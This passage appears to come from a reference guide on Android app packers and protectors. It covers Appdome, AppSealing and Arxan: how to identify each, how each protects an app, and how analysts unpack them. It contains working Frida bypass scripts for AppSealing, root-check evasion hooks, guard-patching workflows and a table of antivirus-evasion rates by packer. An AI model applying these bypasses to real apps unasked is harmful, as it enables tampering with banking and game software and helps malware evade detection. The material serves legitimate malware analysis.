overlay injection or accessibility manipulation. Guardsquare consolidation Guardsquare's acquisition of Verimatrix XTD (Feb 2026) means one vendor now controls DexGuard, R8/ProGuard, and Verimatrix XTD. Expect product consolidation and white-box crypto integration into DexGuard. Korean market protectors LIAPP and AppSealing dominate the Korean banking and gaming markets. LIAPP's server-side token verification introduces a new dimension that purely client-side protectors lack. No-code SaaS protection Appdome and AppSealing offer cloud-based protection without build pipeline changes. Appeals to organizations without mobile security engineering teams. Manifest-level evasion SoumniBot demonstrated that packing the code is not the only option. Malforming the APK structure itself can defeat analysis tools without any packer."},{"location":"packers/#detection-evasion-effectiveness","title":"Detection Evasion Effectiveness","text":"<p>How much each protection layer reduces detection rates across multi-engine scanning:</p> Protection Approximate Detection Rate Reduction Why No protection Baseline All engines can scan the raw DEX R8/ProGuard only 5-10% Engines pattern-match on behavior, not names Chinese packer (basic) 30-50% Engines scan the stub, not the encrypted payload AppSealing 30-50% Similar to Chinese packers; DEX encrypted but weak string protection DexGuard 50-70% String encryption hides IoCs; class encryption hides behavior patterns LIAPP 50-70% Full DEX encryption + native string encryption + server-side layer Appdome 50-70% DEX encryption + native library encryption + multi-vector RASP zShield 60-80% XXTEA ELF encryption + .szip DEX + randomized library names Verimatrix XTD 50-70% Code encryption + multi-language obfuscation + inlined string decryption Virbox (virtualized) 70-90% Proprietary VM instructions are opaque to all static scanners Custom packer + obfuscation 60-80% Varies by implementation quality RASP only (no packing) 0-10% Code is still scannable; RASP operates at runtime <p>These figures are approximate and based on observed VirusTotal detection ratios for packed vs unpacked samples of the same families. The main takeaway: DEX virtualization (Virbox) provides the highest static analysis resistance, while basic Chinese packers offer adequate protection against automated scanning but fall quickly to manual Frida-based analysis.</p>"},{"location":"packers/appdome/","title":"Appdome","text":"<p>Appdome is a commercial no-code mobile security platform developed by Appdome Inc (USA/Israel). It operates as a cloud-based SaaS that applies protection to compiled APK/AAB binaries without requiring source code access. The platform uses a patented \"Fusion\" technology that merges microservice-based protection plugins into existing Android and iOS applications through a web portal or REST API.</p>"},{"location":"packers/appdome/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Appdome Inc Origin Redwood City, California / Tel Aviv, Israel Type Commercial SaaS Protector (no-code, post-build) Platforms Android, iOS Integration Cloud portal upload, REST API, CI/CD plugins Model Per-app subscription licensing"},{"location":"packers/appdome/#how-fusion-works","title":"How Fusion Works","text":"<p>Appdome's Fusion engine operates on compiled binaries rather than source code. The workflow:</p> <ol> <li>Upload a compiled APK or AAB to the Appdome cloud portal (or submit via REST API)</li> <li>The Fusion engine analyzes the binary structure -- frameworks, libraries, SDKs, native components</li> <li>Selected protection plugins (microservice-based) are merged into the application</li> <li>At least one additional <code>classes.dex</code> is injected containing the protection policy logic</li> <li>The original <code>classes.dex</code> is modified to hook initialization and route through Appdome's protection layer</li> <li>The secured binary is output for signing and distribution</li> </ol> <p>The REST API enables CI/CD integration, allowing automated protection as part of build pipelines without manual portal interaction. Protection configuration is defined as a \"Fusion Set\" that specifies which plugins to apply.</p>"},{"location":"packers/appdome/#identification","title":"Identification","text":""},{"location":"packers/appdome/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies Appdome with the following signatures:</p> <pre><code>protector : Appdome\nAppdome (dex)\n</code></pre>"},{"location":"packers/appdome/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library <code>libloader.so</code> in <code>lib/arm64-v8a/</code> and <code>lib/armeabi-v7a/</code> Additional DEX Extra <code>classes.dex</code> file(s) containing protection policy String references Strings in <code>libloader.so</code> reference Appdome obfuscating compiler Modified manifest AndroidManifest.xml modified to route through Appdome initialization"},{"location":"packers/appdome/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/appdome/#dex-encryption-white-hat-android-packer","title":"DEX Encryption (White Hat Android Packer)","text":"<p>Appdome encrypts DEX bytecode using what it markets as a \"White Hat Android Packer.\" The original application code is encrypted and decrypted at runtime through the native <code>libloader.so</code> library.</p>"},{"location":"packers/appdome/#dex-and-control-flow-obfuscation","title":"DEX and Control Flow Obfuscation","text":"<p>The \"Dex Relocation\" plugin applies multiple obfuscation layers:</p> <ul> <li>Call obfuscation -- indirect method invocations replace direct calls</li> <li>Function call modification -- original call sites are rewritten</li> <li>Dummy code injection -- non-functional code paths inserted to complicate static analysis</li> <li>Control flow flattening within protected methods</li> </ul>"},{"location":"packers/appdome/#native-library-encryption","title":"Native Library Encryption","text":"<p>Native <code>.so</code> libraries bundled with the application are encrypted at rest and decrypted at load time through Appdome's native protection layer.</p>"},{"location":"packers/appdome/#ssl-pinning-with-bypass-detection","title":"SSL Pinning with Bypass Detection","text":"<p>Appdome implements certificate pinning that actively detects bypass attempts rather than simply failing silently. The pinning layer monitors for signs of MITM proxy interception and can trigger defensive responses when bypass tools are detected.</p>"},{"location":"packers/appdome/#anti-frida","title":"Anti-Frida","text":"<p>Appdome's Frida detection covers multiple injection vectors:</p> Detection Vector Description frida-server Detects standard frida-server process Inject mode Detects Frida injected via ptrace Gadget mode Detects FridaGadget.so loaded into the process Custom modules Scans for non-standard Frida modules Objection Detects Objection framework runtime StrongR Frida Detects recompiled Frida builds with modified signatures"},{"location":"packers/appdome/#anti-xposed","title":"Anti-Xposed","text":"<p>Detects the Xposed framework through class presence checks, stack trace inspection, and module enumeration.</p>"},{"location":"packers/appdome/#root-detection","title":"Root Detection","text":"Target Detection Magisk Binary presence, mount namespace analysis MagiskHide Detects hide list manipulation Shamiko Zygisk module detection Zygisk Module injection framework detection SuperSU su binary and package detection RootCloak Cloaking module detection"},{"location":"packers/appdome/#emulator-detection","title":"Emulator Detection","text":"<p>Identifies emulated environments through build properties, hardware fingerprinting, sensor availability, and telephony state analysis.</p>"},{"location":"packers/appdome/#anti-debugging","title":"Anti-Debugging","text":"<p>Monitors for debugger attachment via TracerPid checks, ptrace status, JDWP connection detection, and native debugger signatures.</p>"},{"location":"packers/appdome/#anti-tampering-oneshield","title":"Anti-Tampering (OneShield)","text":"<p>Appdome's OneShield feature validates the integrity of the protected binary at runtime. It checks APK signatures, DEX checksums, and native library integrity. Tampering triggers configurable responses including immediate termination or silent reporting.</p>"},{"location":"packers/appdome/#anti-repackaging","title":"Anti-Repackaging","text":"<p>Detects when the APK has been decompiled, modified, and rebuilt by verifying structural integrity beyond just the signing certificate.</p>"},{"location":"packers/appdome/#malware-and-overlay-detection","title":"Malware and Overlay Detection","text":"<p>Detects malicious overlay attacks and identifies known malware patterns running alongside the protected application.</p>"},{"location":"packers/appdome/#unpacking-methodology","title":"Unpacking Methodology","text":"<p>No comprehensive public bypass tool exists for Appdome. The multi-layered detection model means each protection mechanism must be defeated individually.</p>"},{"location":"packers/appdome/#primary-vector-native-library-patching","title":"Primary Vector: Native Library Patching","text":"<p>The most documented approach targets native library detection routines:</p> <ol> <li>Decompile the APK using apktool</li> <li>Load <code>libloader.so</code> into Ghidra or IDA Pro</li> <li>Locate Frida detection functions by searching for strings related to <code>/proc/net/unix</code>, <code>frida</code>, <code>gadget</code>, port 27042</li> <li>Patch detection function return values to always return \"safe\" -- NOP the branch or force the return register</li> <li>Rebuild and resign the APK</li> </ol> <p>This approach is limited by OneShield integrity checks, which detect the patched native library. Defeating OneShield requires locating and patching the integrity verification routines as well, creating a chain of patches.</p>"},{"location":"packers/appdome/#observed-bypass-attempts","title":"Observed Bypass Attempts","text":"<p>XDA Forums discussions document scenarios where root hiding (MagiskHide/Shamiko) combined with developer mode restrictions and Frida concealment can get past initial checks, but the application crashes when attempting SSL pinning bypass. This confirms the layered detection model -- bypassing one layer exposes the next.</p> <p>Progressive bypass is necessary: disable anti-debugging first, then anti-root, then anti-Frida, then SSL pinning, with each layer potentially requiring both Java and native level patches.</p>"},{"location":"packers/appdome/#malware-usage","title":"Malware Usage","text":"<p>Appdome has not been observed protecting malware samples. The cloud-based SaaS model makes it impractical for malware authors:</p> <ul> <li>Requires account creation with identity verification</li> <li>All protected binaries pass through Appdome's cloud infrastructure</li> <li>Per-app licensing creates a cost barrier</li> <li>Cloud processing leaves an audit trail</li> </ul>"},{"location":"packers/appdome/#industry-usage","title":"Industry Usage","text":"<p>Appdome is deployed primarily in industries requiring mobile app security compliance:</p> <ul> <li>Banking and financial services</li> <li>Fintech and mobile payments</li> <li>mCommerce and retail</li> <li>Trading platforms</li> <li>Healthcare applications</li> </ul> <p>The no-code model appeals to organizations without dedicated mobile security engineering teams, allowing security teams to apply protection without modifying build pipelines or requiring developer involvement.</p>"},{"location":"packers/appdome/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Appdome DexGuard DexProtector Promon Integration Cloud SaaS (no-code) Gradle plugin (source required) CLI post-build SDK integration Source required No Yes No No DEX encryption Yes Yes Yes No Code virtualization No Optional No No Anti-Frida Multi-vector Port + maps scanning Yes Yes Root detection Comprehensive Comprehensive Yes Core feature SSL pinning With bypass detection Native-level Yes Yes Malware adoption None Cracked versions in malware Rare None Unpacking difficulty Medium-high (layered) Medium (Frida hooks) Medium-high N/A (RASP)"},{"location":"packers/appdome/#references","title":"References","text":"<ul> <li>Appdome Mobile Security Platform</li> <li>Appdome Fusion Technical Overview</li> <li>Appdome REST API Documentation</li> <li>APKiD -- Android Application Identifier</li> <li>Appdome Anti-Frida Documentation</li> <li>Appdome OneShield Integrity Protection</li> </ul>"},{"location":"packers/appsealing/","title":"AppSealing","text":"<p>AppSealing is a cloud-based SaaS application protection platform developed by INKA Entworks (South Korea). It provides DEX encryption, native library protection, and anti-cheat detection through a web console where developers upload APKs and receive protected builds. The SaaS delivery model means no local tooling or build integration is required, distinguishing it from source-level protectors like DexGuard.</p>"},{"location":"packers/appsealing/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer INKA Entworks Origin South Korea Type Commercial SaaS Packer/Protector Platforms Android, iOS, Hybrid (Unity, Unreal, Cocos2d) Delivery Cloud-based (upload APK, receive protected build) Market Korean banking, gaming, enterprise apps Website appsealing.com"},{"location":"packers/appsealing/#identification","title":"Identification","text":""},{"location":"packers/appsealing/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies AppSealing with:</p> <pre><code>packer : appsealing\n</code></pre>"},{"location":"packers/appsealing/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>libcovault-appsec.so</code> Primary native security library <code>AppSealingZygote</code> Bootstrap class that initializes protection before app launch <code>assets/AppSealing/</code> Directory containing encrypted payloads and configuration <code>sealed1.dex</code> Encrypted DEX payload <code>aws_classes.dex</code> AppSealing wrapper DEX containing loader classes <code>api.appsealing.com</code> API endpoint for license verification and configuration"},{"location":"packers/appsealing/#appsealing-asset-directory","title":"AppSealing Asset Directory","text":"<p>The <code>assets/AppSealing/</code> directory contains a set of numbered and lettered files:</p> File Purpose <code>1</code> Primary encrypted payload <code>11</code> Secondary payload data <code>a1</code> Architecture-specific native data <code>a3</code> Architecture-specific native data (alternate) <code>aslc</code> AppSealing license configuration <code>hr</code> Hash/integrity reference data <code>s1</code> Sealed configuration block <code>s3</code> Sealed configuration block (alternate) <code>si</code> Sealing information metadata <code>x1</code> Executable payload (primary arch) <code>x3</code> Executable payload (alternate arch) <p>The naming scheme uses single characters and short codes rather than descriptive names. The numeric pairs (1/11, s1/s3, x1/x3, a1/a3) correspond to different architecture targets or protection layers.</p>"},{"location":"packers/appsealing/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/appsealing/#dex-encryption","title":"DEX Encryption","text":"<p>AppSealing encrypts application DEX files and decrypts them at runtime through the native <code>libcovault-appsec.so</code> library. Supports:</p> <ul> <li>Selective DEX encryption -- individual classes or packages can be marked for encryption</li> <li>ODEX protection -- prevents caching of decrypted optimized DEX</li> <li>Multi-DEX support -- handles apps with multiple DEX files</li> </ul> <p>The encrypted DEX is stored as <code>sealed1.dex</code> and loaded through a custom class loader initialized by <code>AppSealingZygote</code>.</p>"},{"location":"packers/appsealing/#so-file-encryption","title":"SO File Encryption","text":"<p>Native <code>.so</code> libraries are encrypted within the APK and decrypted at load time. This prevents static extraction and analysis of JNI code.</p>"},{"location":"packers/appsealing/#dll-encryption-unity","title":"DLL Encryption (Unity)","text":"<p>For Unity-based games, AppSealing encrypts <code>libil2cpp.so</code> and Mono assemblies (<code>.dll</code> files). This is a targeted feature for the gaming market where IL2CPP reverse engineering is a primary threat.</p>"},{"location":"packers/appsealing/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects ptrace-based debuggers, JDWP connections, and common debugging tools. The native security component uses <code>kill</code>, <code>signal</code>, and <code>alarm</code> syscalls to terminate the process when debugging is detected. Patching or hooking these three functions at the native level prevents the crash-on-detection behavior.</p>"},{"location":"packers/appsealing/#anti-decompile","title":"Anti-Decompile","text":"<p>Inserts invalid bytecode sequences and malformed headers that cause decompilers (JADX, JEB, Procyon) to fail on protected classes. This is a static analysis impediment only and does not affect runtime execution.</p>"},{"location":"packers/appsealing/#root-and-emulator-detection","title":"Root and Emulator Detection","text":"<p>Checks for:</p> <ul> <li><code>su</code> binary presence and known root management apps</li> <li>Magisk artifacts (though detection is basic compared to DexProtector or Promon)</li> <li>Emulator indicators via Build properties and hardware fingerprints</li> <li>Common emulator packages (Genymotion, BlueStacks, Nox)</li> </ul>"},{"location":"packers/appsealing/#cheat-tool-detection","title":"Cheat Tool Detection","text":"<p>Targets game modification tools:</p> <ul> <li>GameGuardian memory editor</li> <li>Lucky Patcher</li> <li>Xposed framework</li> <li>Frida (basic port check)</li> <li>Speed hack tools (Cheat Engine mobile variants)</li> </ul>"},{"location":"packers/appsealing/#repackaging-prevention","title":"Repackaging Prevention","text":"<p>Signature verification against the original signing certificate. Detects APK modification by comparing checksums of critical components.</p>"},{"location":"packers/appsealing/#weaknesses","title":"Weaknesses","text":""},{"location":"packers/appsealing/#string-encryption","title":"String Encryption","text":"<p>AppSealing's string encryption is weak. Encrypted strings in the native layer use simple transformations that are easily reversible through static analysis of <code>libcovault-appsec.so</code>. This contrasts with DexGuard's polymorphic per-build string encryption or DexProtector's white-box key derivation.</p>"},{"location":"packers/appsealing/#detection-bypass-surface","title":"Detection Bypass Surface","text":"<p>The detection methods rely on predictable check patterns. The native security component's use of <code>kill</code>, <code>signal</code>, and <code>alarm</code> for enforcement means that hooking these three libc functions neutralizes the entire crash-on-detection mechanism in one pass:</p> <pre><code>var kill = Module.findExportByName(\"libc.so\", \"kill\");\nInterceptor.attach(kill, {\n    onEnter: function(args) {\n        console.log(\"Blocked kill(\" + args[0] + \", \" + args[1] + \")\");\n        args[0] = ptr(0);\n    }\n});\n\nvar signal_func = Module.findExportByName(\"libc.so\", \"signal\");\nInterceptor.attach(signal_func, {\n    onEnter: function(args) {\n        console.log(\"Blocked signal(\" + args[0] + \")\");\n    },\n    onLeave: function(retval) {\n        retval.replace(ptr(0));\n    }\n});\n\nvar alarm = Module.findExportByName(\"libc.so\", \"alarm\");\nInterceptor.attach(alarm, {\n    onEnter: function(args) {\n        console.log(\"Blocked alarm(\" + args[0] + \")\");\n        args[0] = ptr(0);\n    }\n});\n</code></pre>"},{"location":"packers/appsealing/#java-side-message-box-bypass","title":"Java-Side Message Box Bypass","text":"<p>AppSealing displays a Java-side dialog when it detects a hostile environment (root, hook, cheat tool). This dialog can be suppressed via Xposed hooks on <code>AlertDialog.Builder</code> or by hooking the specific AppSealing callback class, allowing the app to continue running on detected devices.</p>"},{"location":"packers/appsealing/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/appsealing/#apppealing-xposed-module","title":"AppPealing Xposed Module","text":"<p>AppPealing is a purpose-built Xposed module that:</p> <ul> <li>Disables cheat tool detection checks</li> <li>Dumps encrypted DEX files after decryption</li> <li>Decrypts sealed DEX payloads from the <code>assets/AppSealing/</code> directory</li> <li>Patches the <code>AppSealingZygote</code> initialization to skip integrity checks</li> </ul> <p>This is the most targeted public tool for AppSealing bypass. Install via LSPosed, scope to the target app, and the module handles DEX extraction automatically.</p>"},{"location":"packers/appsealing/#appsealing-reversal","title":"Appsealing-Reversal","text":"<p>Appsealing-Reversal provides a full analysis of the AppSealing protection scheme, including:</p> <ul> <li>Detailed breakdown of the native library initialization flow</li> <li>Identification of all check points and enforcement mechanisms</li> <li>Bypass strategies for each protection layer</li> <li>Documentation of the asset file format and encryption scheme</li> </ul>"},{"location":"packers/appsealing/#frida-dexdump","title":"frida-dexdump","text":"<p>Standard frida-dexdump works for DEX recovery from AppSealing-protected apps:</p> <pre><code>frida-dexdump -FU\n</code></pre> <p>After the app initializes and <code>AppSealingZygote</code> decrypts the sealed DEX into memory, frida-dexdump scans for DEX magic bytes and dumps all loaded DEX files. Filter the output by size to separate application DEX from framework and AppSealing wrapper DEX.</p>"},{"location":"packers/appsealing/#combined-frida-bypass","title":"Combined Frida Bypass","text":"<p>A combined approach using Frida to neutralize all protection layers simultaneously:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n\n[\"kill\", \"signal\", \"alarm\"].forEach(function(fname) {\n    var func = Module.findExportByName(\"libc.so\", fname);\n    if (func) {\n        Interceptor.attach(func, {\n            onEnter: function(args) {\n                console.log(\"Neutralized \" + fname);\n                args[0] = ptr(0);\n            }\n        });\n    }\n});\n</code></pre> <p>Use with <code>frida -f</code> in spawn mode to inject before <code>AppSealingZygote</code> initializes. Once the protection checks are neutralized, attach frida-dexdump to dump the decrypted DEX.</p>"},{"location":"packers/appsealing/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature AppSealing DexGuard DexProtector Chinese Packers Delivery model SaaS (upload APK) Gradle plugin (source required) Post-build CLI SaaS / CLI DEX encryption Yes (selective) Yes (class-level) Yes Yes (whole DEX) String encryption Weak Strong (polymorphic) Strong (white-box) Basic XOR Code virtualization No Optional Hide Access No Anti-Frida Basic (port check) Comprehensive Comprehensive Basic Anti-root Moderate Comprehensive Comprehensive Basic Unity/game support Yes (dedicated) No Limited No Unpacking difficulty Low-Medium Medium-Hard Medium-Hard Easy-Medium Public bypass tools Yes (AppPealing, Appsealing-Reversal) Limited Limited Yes (generic DEX dump) <p>AppSealing occupies a similar market position to Chinese packers in terms of protection strength but targets the Korean and international SaaS market. Its protections are substantially weaker than DexGuard or DexProtector, and the existence of dedicated bypass tools (AppPealing) makes it one of the easier commercial protectors to defeat.</p>"},{"location":"packers/appsealing/#industry-usage","title":"Industry Usage","text":"<p>AppSealing is primarily deployed in:</p> <ul> <li>Korean banking apps -- financial institutions using AppSealing as part of compliance requirements</li> <li>Unity and Unreal games -- anti-cheat and anti-tamper for mobile games, particularly Korean game publishers</li> <li>Enterprise applications -- corporate apps requiring basic IP protection without build pipeline changes</li> </ul> <p>The SaaS model makes it attractive for organizations without dedicated mobile security engineering teams. Upload the APK, configure protection options via the web console, and download the protected build.</p>"},{"location":"packers/appsealing/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm \"packer : appsealing\"\n2. Check for libcovault-appsec.so and assets/AppSealing/ directory\n3. Install on rooted device with LSPosed + AppPealing module\n4. Launch app -&gt; AppPealing dumps decrypted DEX automatically\n5. Alternative: Frida spawn mode with kill/signal/alarm hooks + frida-dexdump\n6. Decompile dumped DEX with JADX\n7. If Unity game: extract and analyze decrypted libil2cpp.so with IL2CPPDumper\n</code></pre>"},{"location":"packers/appsealing/#references","title":"References","text":"<ul> <li>AppSealing Official</li> <li>APKiD -- Packer Detection</li> <li>AppPealing Xposed Module</li> <li>Appsealing-Reversal -- Full Bypass Analysis</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>INKA Entworks</li> </ul>"},{"location":"packers/arxan/","title":"Arxan (Digital.ai Application Protection)","text":"<p>Arxan is a commercial application protection platform originally developed by Arxan Technologies, now part of Digital.ai. Founded in 2001 by researchers from Purdue University's CERIAS Institute, Arxan pioneered guard-based software protection -- a mesh of interdependent protection routines embedded directly into application binaries. It is the dominant protector in banking, financial services, and high-value gaming apps.</p>"},{"location":"packers/arxan/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Digital.ai (formerly Arxan Technologies) Origin USA (founded at Purdue University, West Lafayette, Indiana) Type Commercial Protector/Obfuscator/RASP Platforms Android, iOS, Windows, macOS, Linux, ARM Products GuardIT (code protection), EnsureIT (native/ARM protection), TransformIT (white-box crypto) Acquisition TA Associates (2013), merged into Digital.ai (2020) Website digital.ai/products/app-protection"},{"location":"packers/arxan/#identification","title":"Identification","text":""},{"location":"packers/arxan/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Arxan with signatures targeting both DEX and native layers:</p> <pre><code>obfuscator : Arxan\nobfuscator : Arxan (GuardIT)\n</code></pre> <p>DEX-level detection looks for the <code>Lcom/arxan/guardit</code> package path. Native (ELF) detection targets bytecode patterns characteristic of Arxan's control flow obfuscation, specifically sequences involving <code>move-result</code>, <code>and-int/2addr</code>, and <code>xor-int/lit8</code> operations.</p>"},{"location":"packers/arxan/#file-artifacts","title":"File Artifacts","text":"Artifact Description Package path <code>com.arxan.guardit</code> or obfuscated variants in DEX Native libraries Protected <code>.so</code> files with guard code injected at the object level Control flow patterns Functions split into disconnected basic blocks with opaque predicates String tables Encrypted or absent string literals in native binaries Guard stubs Small code fragments scattered throughout the binary performing integrity checks Section anomalies Modified ELF sections from guard injection post-compilation"},{"location":"packers/arxan/#distinguishing-from-other-protectors","title":"Distinguishing from Other Protectors","text":"<p>Arxan operates primarily at the native (ARM/ELF) level, unlike DexGuard which focuses on DEX-layer protection. Key distinguishing traits:</p> <ul> <li>Guard code is injected post-compilation into the final binary, not during build</li> <li>Functions are fragmented into basic blocks connected by opaque predicates</li> <li>Cyclic CRC checks run continuously at runtime across code regions</li> <li>No single \"unpacking stub\" -- protection is distributed throughout the binary</li> <li>Both Java/Kotlin and native code can be protected simultaneously</li> </ul>"},{"location":"packers/arxan/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/arxan/#guard-network","title":"Guard Network","text":"<p>The core differentiator. Arxan embeds a network of small, interdependent code units called Guards throughout the application binary. Each guard performs a specific security function. Guards protect other guards in a mesh topology -- removing or patching one guard triggers detection by others.</p> Guard Type Function Checksum Guard Computes integrity hash over a defined code range, detects modification Repair Guard Restores tampered code by overwriting a corrupted range with the original bytes Anti-Debug Guard Detects attached debuggers via ptrace, TracerPid, timing checks Damage Guard Overwrites specified code ranges with random bytes during dynamic analysis Notification Guard Calls back to a server or triggers an alert when tampering is detected State Guard Tracks application state to detect inconsistencies from patching <p>The guard network creates a defend-detect-react cycle:</p> <ol> <li>Defend -- obfuscation and guards make the binary resistant to static analysis</li> <li>Detect -- checksum and state guards identify runtime modifications</li> <li>React -- repair guards restore code, damage guards corrupt attacker state, notification guards alert</li> </ol> <p>Because guards protect each other, an attacker cannot simply NOP out a single check. Removing guard A causes guard B (which checksums guard A's code range) to trigger, which in turn activates guard C for repair or damage response.</p>"},{"location":"packers/arxan/#code-obfuscation","title":"Code Obfuscation","text":""},{"location":"packers/arxan/#control-flow-flattening","title":"Control Flow Flattening","text":"<p>Functions are restructured so the original control flow is hidden behind a dispatcher loop. All basic blocks become siblings under a switch statement, with the next block selected by an opaque state variable.</p>"},{"location":"packers/arxan/#opaque-predicates","title":"Opaque Predicates","text":"<p>Conditional branches inserted throughout the code that always resolve the same way at runtime but appear ambiguous during static analysis. These inflate the control flow graph and defeat pattern-based decompilation.</p>"},{"location":"packers/arxan/#stack-based-obfuscation","title":"Stack-Based Obfuscation","text":"<p>Local variables and intermediate values are pushed through stack manipulations that obscure data flow, making it difficult to track values through a function in a decompiler.</p>"},{"location":"packers/arxan/#symbol-stripping-and-renaming","title":"Symbol Stripping and Renaming","text":"<p>All exported symbols, function names, and debug information are stripped or renamed to prevent identification of function purpose.</p>"},{"location":"packers/arxan/#string-encryption","title":"String Encryption","text":"<p>String literals in both native and Java/Kotlin code are encrypted at rest. Decryption happens at runtime through guard-protected routines. Unlike DexGuard where strings decrypt via simple method calls, Arxan string decryption is interleaved with the guard network -- the decryption key material may itself be protected by checksum guards.</p>"},{"location":"packers/arxan/#white-box-cryptography-transformit","title":"White-Box Cryptography (TransformIT)","text":"<p>TransformIT implements standard cryptographic algorithms (AES, DES, RSA) with mathematically transformed key representations. The key never exists in memory in its standard form. Instead, the algorithm and key are fused into a single lookup-table-based implementation.</p> <p>Properties:</p> <ul> <li>Produces identical output to standard crypto implementations</li> <li>Key extraction requires reversing the mathematical transformation, not just memory dumping</li> <li>Supports all major algorithms and modes</li> <li>Minimal code footprint for mobile deployment</li> <li>Protected by the guard network -- tampering with the white-box tables triggers integrity guards</li> </ul>"},{"location":"packers/arxan/#anti-tampering","title":"Anti-Tampering","text":"<ul> <li>Cyclic CRC checks across code regions, running continuously at runtime</li> <li>APK signature verification against expected certificate</li> <li>Code range checksums validated by multiple overlapping guards</li> <li>Response options: crash, SIGILL, silent data corruption, delayed failure, self-repair</li> </ul>"},{"location":"packers/arxan/#anti-debugging","title":"Anti-Debugging","text":"Technique Implementation ptrace self-attach Prevents debugger attachment by occupying the ptrace slot TracerPid monitoring Polls <code>/proc/self/status</code> for non-zero TracerPid Timing checks Measures execution time between guard invocations to detect single-stepping JDWP detection Checks for Java Debug Wire Protocol thread presence Breakpoint scanning Scans code regions for software breakpoint instructions (0xCC / BKPT) Signal handler hooks Monitors for debugger-installed signal handlers"},{"location":"packers/arxan/#root-and-environment-detection","title":"Root and Environment Detection","text":"Check Method Root su binary, Magisk artifacts, SuperSU, system partition writability Emulator Build properties, hardware fingerprints, sensor availability Frida frida-server port (27042), frida-agent in <code>/proc/maps</code>, named pipes Hooking frameworks Xposed, Substrate, LSPosed class presence and stack inspection Repackaging Certificate mismatch, APK path validation"},{"location":"packers/arxan/#dynamic-key-protection","title":"Dynamic Key Protection","text":"<p>Cryptographic keys can be bound to device-specific attributes or server-issued tokens. Keys are never stored in plaintext and are reconstructed at runtime through guard-protected derivation functions. If any guard in the derivation chain detects tampering, the key material is corrupted.</p>"},{"location":"packers/arxan/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/arxan/#challenges","title":"Challenges","text":"<p>Arxan is significantly harder to bypass than DEX-level protectors because:</p> <ul> <li>Protection is distributed (no single point of failure)</li> <li>Guards run continuously, not just at startup</li> <li>Native-level obfuscation resists standard Java-layer hooking</li> <li>CRC checks detect code patching in real time</li> </ul>"},{"location":"packers/arxan/#frida-based-approaches","title":"Frida-Based Approaches","text":""},{"location":"packers/arxan/#bypassing-crc-guards","title":"Bypassing CRC Guards","text":"<p>CRC guards operate over defined code ranges. Frida can be used to intercept and neutralize these checks, but timing is critical -- attaching Frida itself can trigger anti-hook detection.</p> <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"su\") !== -1) {\n            return null;\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level CRC bypass, trampolines can redirect CRC check functions to return expected values. This requires identifying the CRC function addresses first through static analysis.</p>"},{"location":"packers/arxan/#zygiskfrida-for-stealth-injection","title":"ZygiskFrida for Stealth Injection","text":"<p>Standard Frida injection modifies the APK or attaches via ptrace, both detectable by Arxan. ZygiskFrida injects the Frida gadget through Zygisk at process spawn, avoiding APK modification (signature checks pass) and ptrace-based detection.</p>"},{"location":"packers/arxan/#timing-aware-hooking","title":"Timing-Aware Hooking","text":"<p>Arxan's timing checks measure intervals between guard executions. Hooks that introduce latency will trigger detection. Minimize hook logic and use <code>Interceptor.replace</code> over <code>Interceptor.attach</code> where possible to reduce overhead.</p>"},{"location":"packers/arxan/#static-analysis-approach","title":"Static Analysis Approach","text":"<ol> <li>Load the native library in IDA Pro / Ghidra</li> <li>Identify control flow flattening dispatcher blocks (large switch statements with state variables)</li> <li>Use D-810 (IDA) or similar deobfuscation plugins to resolve opaque predicates</li> <li>Map CRC guard functions by looking for code range scanning patterns (reading 4-8 byte windows across sections)</li> <li>Trace guard-to-guard references to map the guard network topology</li> <li>Patch or ignore guard functions once the network is understood</li> </ol>"},{"location":"packers/arxan/#binary-patching-with-guard-awareness","title":"Binary Patching with Guard Awareness","text":"<p>Patching a single guard without accounting for the network causes cascading failures. Approaches:</p> <ul> <li>Map the complete guard dependency graph before patching</li> <li>Patch all guards that reference the target code range simultaneously</li> <li>Replace CRC expected values at every checkpoint, not just one</li> <li>Consider using Frida to dynamically NOP guards at runtime instead of static patching</li> </ul>"},{"location":"packers/arxan/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm Arxan / GuardIT detection\n2. Determine scope: is protection on native libs, DEX, or both?\n3. Load native .so in Ghidra/IDA -&gt; identify flattened control flow\n4. Map guard network: find CRC ranges, repair stubs, damage handlers\n5. Deploy ZygiskFrida for stealthy injection\n6. Hook anti-debug guards first (ptrace, TracerPid checks)\n7. Disable root/environment detection\n8. Identify and hook CRC guard functions to return expected values\n9. Target white-box crypto if key extraction is the goal\n10. For string decryption, hook the decryption routines and log output\n</code></pre>"},{"location":"packers/arxan/#industry-adoption","title":"Industry Adoption","text":"<p>Arxan / Digital.ai Application Protection is the go-to protector for high-value mobile applications, particularly in financial services.</p>"},{"location":"packers/arxan/#sectors","title":"Sectors","text":"Sector Usage Banking Major retail and commercial banks worldwide use Arxan for mobile banking apps Payments Payment processing and digital wallet apps Gaming High-revenue mobile games (notably Supercell titles) Automotive Connected car and telematics applications Healthcare Medical device and health data applications Media/DRM Content protection and digital rights 